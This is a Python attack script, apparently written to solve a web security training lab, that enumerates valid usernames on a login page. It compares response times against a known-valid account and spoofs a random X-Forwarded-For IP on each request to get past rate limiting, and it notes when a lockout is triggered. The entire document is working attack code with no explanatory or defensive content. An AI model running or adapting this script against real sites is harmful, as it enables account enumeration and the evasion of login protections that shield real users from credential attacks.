#!/usr/bin/env python3

import requests
import time
import random

url = "https://<URL>/login"
s = requests.Session()
userfile = open('~/webapp_academy/authentication/users')
usernames = userfile.read().splitlines()
counter = 1
matches = []

data1 = f"username=wiener&password=pass"
headers1 = {"Content-Type" : "application/x-www-form-urlencoded", "X-Forwarded-For" : f"127.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"}
valid_start = time.time()
valid_attempt = s.post(url, headers=headers1, data=data1)
valid_end = time.time()

for i in usernames:
    data = f"username={i}&password=pass"
    headers = {"Content-Type" : "application/x-www-form-urlencoded", "X-Forwarded-For" : f"127.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"}
    start = time.time()
    attempt = s.post(url, headers=headers, data=data)
    end = time.time()
    reqtime = end - start

    if reqtime > (valid_end - valid_start):
        matches.append(i)
    
    print('\x1bc')
    print(f"Running\n\nValid Username Time: {valid_end - valid_start}\n")
    print(f"Trying:\t{i}\nStatus:\t{counter}/{(len(usernames)  - 1)}\n\nMatching Usernames: {len(matches)}/{(len(usernames) - 1)}\n{matches}")
    counter += 1

    if "too many incorrect" in attempt.text:
        print("blocked :(")
        userfile.close()
        exit()

userfile.close()